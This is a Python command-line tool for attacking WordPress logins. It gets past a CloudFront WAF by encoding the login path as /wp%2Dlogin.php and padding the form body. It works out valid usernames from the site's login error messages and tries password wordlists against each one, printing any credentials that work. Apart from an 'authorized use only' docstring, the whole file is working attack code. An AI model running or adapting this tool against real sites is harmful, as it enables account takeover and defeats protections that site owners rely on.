#!/usr/bin/env python3
"""WordPress login testing with /wp%2Dlogin.php CloudFront bypass. Authorized use only."""

from __future__ import annotations

import argparse
import re
import sys
import time
from pathlib import Path
from typing import Iterable

from http_client import CurlSession, request
from waf_bypass import merge_headers, pad_form_body, resolve_login_path

DEFAULT_USERS = Path(__file__).parent / "wordlists" / "users.txt"
DEFAULT_PASSWORDS = Path(__file__).parent / "wordlists" / "passwords.txt"


def load_lines(path: Path) -> list[str]:
    return [line.strip() for line in path.read_text().splitlines() if line.strip() and not line.startswith("#")]


def extract_login_error(html: str) -> str:
    match = re.search(r'id="login_error"[^>]*>(.*?)</div>', html, re.I | re.S)
    if match:
        return re.sub(r"<[^>]+>", "", match.group(1)).strip()
    return ""


def classify_login_error(html: str) -> str:
    if "could not be satisfied" in html.lower() or "403 error" in html.lower():
        return "blocked_by_waf_or_rate_limit"
    msg = extract_login_error(html).lower()
    if "cookie" in msg:
        return "cookie_error_retry"
    if "incorrect" in msg and "password" in msg:
        return "valid_user_bad_password"
    if "invalid password" in msg:
        return "valid_user_bad_password"
    if "invalid username" in msg or "unknown username" in msg or "not registered" in msg:
        return "invalid_username"
    return "unknown"


def login_success(response) -> bool:
    if response.status_code == 403:
        return False
    if "wp-admin" in response.url and response.status_code in (200, 302):
        return True
    lower = response.text.lower()
    return "dashboard" in lower and "wp-admin" in lower


def try_login(
    session: CurlSession,
    base_url: str,
    username: str,
    password: str,
    *,
    bypass: str,
    waf_body_pad: bool,
) -> tuple[bool, int, str]:
    login_url = resolve_login_path(base_url, bypass=bypass)
    session.request("GET", login_url, headers=merge_headers(None, {"Referer": login_url}))

    fields = {
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": base_url.rstrip("/") + "/wp-admin/",
        "testcookie": "1",
    }
    if waf_body_pad:
        fields = pad_form_body(fields)

    response = session.request(
        "POST",
        login_url,
        data=fields,
        headers=merge_headers(
            {
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": login_url,
                "Origin": base_url.rstrip("/"),
            },
            None,
        ),
    )
    ok = login_success(response)
    note = "authenticated" if ok else classify_login_error(response.text)
    if note == "unknown" and extract_login_error(response.text):
        note = f"unknown: {extract_login_error(response.text)[:80]}"
    return ok, response.status_code, note


def brute_force(
    base_url: str,
    users: Iterable[str],
    passwords: Iterable[str],
    *,
    bypass: str,
    waf_body_pad: bool,
    delay: float,
    enumerate_only: bool,
) -> dict[str, str] | None:
    for user in users:
        session = CurlSession()
        if enumerate_only:
            ok, status, note = try_login(
                session, base_url, user, "__invalid_probe__", bypass=bypass, waf_body_pad=False
            )
            print(f"  [{status}] {user} -> {note}")
            if delay:
                time.sleep(delay)
            continue

        for password in passwords:
            session = CurlSession()
            ok, status, note = try_login(
                session, base_url, user, password, bypass=bypass, waf_body_pad=waf_body_pad
            )
            print(f"  [{status}] {user}:{password} -> {note}")
            if ok:
                return {"username": user, "password": password}
            if delay:
                time.sleep(delay)
    return None


def main() -> int:
    parser = argparse.ArgumentParser(description="WordPress login tester + CloudFront WAF bypass")
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("--users", type=Path, default=DEFAULT_USERS)
    parser.add_argument("--passwords", type=Path, default=DEFAULT_PASSWORDS)
    parser.add_argument("--bypass", choices=("none", "hyphen", "encoded"), default="hyphen")
    parser.add_argument("--no-waf-body-pad", action="store_true")
    parser.add_argument("--enumerate-only", action="store_true")
    parser.add_argument("--delay", type=float, default=2.0)
    args = parser.parse_args()

    users = load_lines(args.users)
    passwords = load_lines(args.passwords) if not args.enumerate_only else ["x"]

    print(f"[*] Target: {args.url}")
    print(f"[*] Login path: {resolve_login_path(args.url, bypass=args.bypass)}")
    print(f"[*] Users: {len(users)}")
    if args.enumerate_only:
        print("[*] Mode: enumeration only (invalid password probe)")

    creds = brute_force(
        args.url,
        users,
        passwords,
        bypass=args.bypass,
        waf_body_pad=not args.no_waf_body_pad,
        delay=args.delay,
        enumerate_only=args.enumerate_only,
    )
    if creds:
        print(f"[+] Valid credentials: {creds['username']} / {creds['password']}")
        return 0
    if args.enumerate_only:
        return 0
    print("[-] No valid credentials found")
    return 1


if __name__ == "__main__":
    sys.exit(main())
